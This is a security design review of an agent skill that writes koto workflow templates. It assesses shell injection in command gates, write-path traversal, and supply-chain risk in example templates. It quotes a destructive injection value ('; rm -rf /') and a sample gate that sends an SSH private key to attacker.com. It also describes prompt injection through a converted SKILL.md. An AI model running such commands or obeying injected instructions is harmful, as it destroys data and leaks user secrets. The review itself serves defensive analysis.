# Security Review: koto-template-authoring-skill (Phase 6)

**Reviewer:** Independent security analysis
**Date:** 2026-03-29
**Artifact:** DESIGN-koto-template-authoring-skill.md
**Prior analysis:** design_koto-template-authoring-skill_phase5_security.md

## Scope

This review answers four questions:
1. Are there attack vectors not considered by the Phase 5 analysis?
2. Are mitigations sufficient for identified risks?
3. Are any "not applicable" justifications actually applicable?
4. Is there residual risk that should be escalated?

---

## Question 1: Uncovered attack vectors

### 1A. Variable injection into command gates (MEDIUM)

The Phase 5 analysis and the design doc's security section both state: "the skill reads and writes local markdown files and runs a trusted local binary." This understates the actual execution surface.

The design includes a `compile_validation` state with a `context-exists` gate. The design also references command gates as a template feature that agents will learn to author. More critically, the **koto codebase itself** performs variable substitution in gate command strings at runtime (see `src/cli/mod.rs` lines 1535-1542), despite the template format design doc explicitly stating "no `{{VARIABLE}}` interpolation in command strings (prevents injection)."

This means templates authored by this skill may contain command gates with `{{VARIABLE}}` references, and those references **will** be substituted at runtime. The compile-time validation checks that referenced variables are declared (`extract_refs` in `src/template/types.rs`), but it does not validate the **values** substituted at runtime. If a template author writes a gate like:

```yaml
gates:
  check:
    type: command
    command: "test -f {{USER_INPUT}}/result.txt"
```

And the variable value at runtime contains shell metacharacters (e.g., `; rm -rf /`), the substituted string is passed to `sh -c` unsanitized. This is a general koto concern, not specific to this skill, but the authoring skill **teaches agents to write templates with gates and variables**. If the reference material doesn't clearly flag this risk, it amplifies the chance of agents producing injectable gate commands.

**Recommendation:** The condensed format guide (`references/template-format.md`) should include an explicit warning: never use user-supplied variable values in command gate strings without quoting. Better yet, document the pattern of using `context-exists` gates instead of command gates when the check involves user-supplied paths.

### 1B. Output path writes outside target directory (LOW)

The skill produces output files at a user-specified target path (`<target-plugin>/skills/<skill-name>/`). The agent determines this path during the workflow. If the agent is influenced (by adversarial content in a source SKILL.md during convert mode, or by ambiguous user input) to write to an unexpected location, it could overwrite files outside the intended target.

The Phase 5 analysis notes the path traversal concern for **reads** in convert mode but does not address the **write** side. The agent writes at least two files: the koto template and the SKILL.md. If the target path resolves to something like `../../.claude/settings.json`, the agent could overwrite configuration.

This is bounded by the Claude Code sandbox (agents can only write where the sandbox allows), so the practical impact is limited to the project directory. But within that directory, overwriting a Makefile, CI config, or existing skill file is plausible.

**Recommendation:** The integration_check state's directive should instruct the agent to verify the target path is under the expected plugin directory before writing. The Phase 5 analysis should acknowledge the write-side path concern alongside the read-side one.

### 1C. Self-loop denial of context (LOW)

The compile_validation state self-loops up to 3 times on failure. Each loop iteration consumes agent context window. A template that is structurally close to valid but triggers a cascade of errors could cause the agent to spend significant context on fix attempts, leaving insufficient context for the remaining phases (SKILL.md authoring and integration check). This is a quality/reliability concern rather than a security one, but the Phase 5 analysis doesn't mention it.

The 3-attempt cap is adequate. No additional mitigation needed.

### 1D. Template as trojan horse via reference examples (LOW)

The graded example templates in `references/examples/` are static files shipped with the skill. If a supply chain compromise replaced these files (e.g., a malicious PR adding a command gate that exfiltrates data), every skill authored using this tool would inherit the malicious pattern. This is identical to the "compromised koto binary" risk from Phase 5 but with a different vector: the binary is compiled and reviewed; reference markdown files might receive less scrutiny.

**Recommendation:** The `validate-plugins.yml` CI workflow already compiles templates but doesn't lint for suspicious patterns (e.g., command gates with `curl`, `wget`, or pipe-to-shell patterns). Consider adding a CI check that flags command gates in reference/example templates.

---

## Question 2: Mitigation sufficiency

### Existing mitigations assessed

| Risk | Mitigation claimed | Sufficient? |
|------|-------------------|-------------|
| Template injection via SKILL.md (convert mode) | `koto template compile` validates output | **Partially.** The compiler validates structure, not semantics. A prompt-injected SKILL.md could cause the agent to produce a structurally valid but semantically malicious template (e.g., a command gate that runs `curl attacker.com/$(cat ~/.ssh/id_rsa)`). The compiler would pass this. |
| Path traversal (reads) | Agent sandboxing | **Sufficient.** The sandbox constrains reads to the project. |
| Compromised koto binary | Installation-layer checksums | **Sufficient.** Out of scope for this design. |
| Mode-conditional directive confusion | Graded examples | **Partially.** If directive prose for convert mode is unclear, agents may skip important steps (like removing boilerplate). This is a quality risk, not a security risk, so partial mitigation is acceptable. |

### Gap: No mitigation for semantically malicious templates

The compiler validates syntax and structural rules (13+ checks). It does **not** validate:
- What command gates execute
- Whether gates exfiltrate data
- Whether evidence routing leaks information

This gap is acknowledged in the design's consequences ("The skill can't catch runtime behavior issues") but not in the security section. Since the skill's entire purpose is to produce templates that will be executed, the security section should explicitly state that the compiler is a structural check only and that produced templates require human review before use in production.

**Recommendation:** Add a note to the security section: "Produced templates should be reviewed before deployment. The compile gate validates structure, not intent."

---

## Question 3: "Not applicable" justification review

The Phase 5 analysis marks all four dimensions as low/negligible. Let me check each:

| Dimension | Phase 5 Rating | My Assessment |
|-----------|---------------|---------------|
| External artifact handling | Partially applicable, Low | **Agree.** The convert-mode SKILL.md read is the only external input, and it's local. The injection risk is real but bounded by compilation. |
| Permission scope | Applicable, Negligible | **Disagree: should be Low, not Negligible.** The skill writes files to user-specified paths and runs `koto template compile` which parses potentially adversarial YAML. The write-path concern (1B above) adds surface beyond "standard agent behavior." Still low severity, but not negligible. |
| Supply chain | Minimally applicable, Negligible | **Agree.** No new dependencies introduced. Reference file trojan risk (1D) is a stretch. |
| Data exposure | Minimally applicable, Negligible | **Agree.** No network communication. Secret leakage is user error. |

The only adjustment: Permission scope should be Low rather than Negligible, due to the unconstrained write path and the fact that `koto template compile` parses agent-generated YAML (though the parser is deterministic and not known to have vulnerabilities).

---

## Question 4: Residual risk escalation

### Should any risk be escalated?

**No.** None of the identified risks warrant blocking the design or requiring architectural changes.

The variable injection in command gates (1A) is the most significant finding, but it's a pre-existing koto concern, not introduced by this design. The authoring skill **amplifies** the risk by making it easier to create templates with command gates, but the fix belongs in the format guide (documentation) rather than in the design itself.

### Residual risks to track

1. **Templates produced by this skill may contain injectable command gates.** Track as a documentation task: the format guide must warn about shell injection in command strings.

2. **No semantic review of produced templates.** The skill validates structure but not intent. Human review remains necessary. This is an inherent limitation of compiler-based validation and doesn't need escalation -- just clear documentation.

3. **Discrepancy between design doc and implementation regarding variable interpolation in command gates.** The template format design doc says "No `{{VARIABLE}}` interpolation in command strings (prevents injection)" but the implementation (`src/cli/mod.rs` lines 1535-1542) substitutes variables in gate commands. This discrepancy should be resolved -- either update the design doc to reflect reality and add safety guidance, or remove the substitution from the implementation. This predates the authoring skill design but is directly relevant because the authoring skill will teach agents to write command gates.

---

## Summary

| Finding | Severity | Category | Action |
|---------|----------|----------|--------|
| Variable injection in command gates via template substitution | Medium | Uncovered vector | Document in format guide; resolve design/implementation discrepancy |
| Output path writes outside target directory | Low | Uncovered vector | Add path validation to integration_check directive |
| Semantic gap in compile validation | Low | Mitigation gap | Document that human review is needed for produced templates |
| Reference examples as supply chain vector | Low | Uncovered vector | Consider CI lint for suspicious patterns in examples |
| Permission scope underrated | Low | Rating adjustment | Adjust from Negligible to Low |
| Self-loop context exhaustion | Low | Uncovered vector | Existing 3-attempt cap is sufficient |

**Overall assessment:** The Phase 5 analysis is directionally correct -- this design has low security risk. The most actionable finding is the variable-injection-in-command-gates concern, which is a pre-existing koto issue amplified by the authoring skill's teaching role. It should be addressed through documentation in the format guide rather than design changes. No findings warrant blocking the design.
